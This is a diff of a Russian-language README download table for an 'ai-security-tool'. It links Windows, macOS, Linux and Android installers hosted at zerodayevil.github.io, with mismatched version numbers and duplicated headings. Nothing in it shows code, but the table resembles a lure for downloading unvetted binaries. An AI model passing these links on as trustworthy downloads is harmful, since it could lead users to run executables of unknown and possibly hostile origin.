@@ -171,45 +171,59 @@
 
   <h2>🚀 Quick Start & Installation</h2>
   <h3>📦 Ready-to-Use Builds</h3>
+  <h2>🚀 Quick Start & Installation</h2>
+  <h3>📦 Ready-to-Use Builds</h3>
   <table>
     <thead>
       <tr>
-        <th>Платформа</th>
-         <th>Версия</th>
+        <th>ОС / Платформа</th>
+        <th>Версия</th>
         <th>Архитектура / Формат</th>
-        <th>Ссылка</th>
+        <th>Дата обновления</th>
+        <th>Статус</th>
+        <th>Загрузка</th>
       </tr>
     </thead>
     <tbody>
       <tr>
-        <td><strong>Windows</strong></td>
-       <td>x64 Installer (.exe)</td>
+        <td><strong>🪟 Windows</strong></td>
+        <td><code>v6.3.20</code></td>
         <td>x64 Installer (.exe)</td>
-        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64-installer.exe">Скачать .exe</a></td>
+        <td>2026-09-08</td>
+        <td>🟢 Latest</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#6.3.20-win-x64-installer.exe"><strong>Скачать .exe</strong></a></td>
       </tr>
       <tr>
-        <td><strong>Windows</strong></td>
-       <td>x64 Installer (.exe)</td>
+        <td><strong>🪟 Windows</strong></td>
+        <td><code>v6.3.20</code></td>
         <td>x64 Portable (.tar.gz)</td>
-        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64.tar.gz">Скачать .tar.gz</a></td>
+        <td>2026-09-08</td>
+        <td>🟢 Latest</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#6.3.20-win-x64.tar.gz"><strong>Скачать .tar.gz</strong></a></td>
       </tr>
       <tr>
-        <td><strong>macOS</strong></td>
-       <td>x64 Installer (.exe)</td>
+        <td><strong>🍏 macOS</strong></td>
+        <td><code>v5.3.29</code></td>
         <td>Apple Silicon M1/M2/M3 (.dmg)</td>
-        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-mac-arm64.dmg">Скачать .dmg</a></td>
+        <td>2026-09-05</td>
+        <td>🟢 Stable</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.29-mac-arm64.dmg"><strong>Скачать .dmg</strong></a></td>
       </tr>
       <tr>
-        <td><strong>Linux</strong></td>
-       <td>x64 Installer (.exe)</td>
+        <td><strong>🐧 Linux</strong></td>
+        <td><code>v5.3.27</code></td>
         <td>Universal x64 (.tar.gz)</td>
-        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.26-linux-x64.tar.gz">Скачать .tar.gz</a></td>
+        <td>2026-09-01</td>
+        <td>🟢 Stable</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#5.3.27-linux-x64.tar.gz"><strong>Скачать .tar.gz</strong></a></td>
       </tr>
       <tr>
-        <td><strong>Android</strong></td>
-       <td>x64 Installer (.exe)</td>
+        <td><strong>🤖 Android</strong></td>
+        <td><code>v8a 5.3.27</code></td>
         <td>ARM64 APK (.apk)</td>
-        <td><a href="https://zerodayevil.github.io/ai-security-tool#android-arm64-v8a-5.3.27.apk">Скачать .apk</a></td>
+        <td>2026-09-01</td>
+        <td>🟢 Stable</td>
+        <td><a href="https://zerodayevil.github.io/ai-security-tool#android-arm64-v8a-5.3.27.apk"><strong>Скачать .apk</strong></a></td>
       </tr>
     </tbody>
   </table>
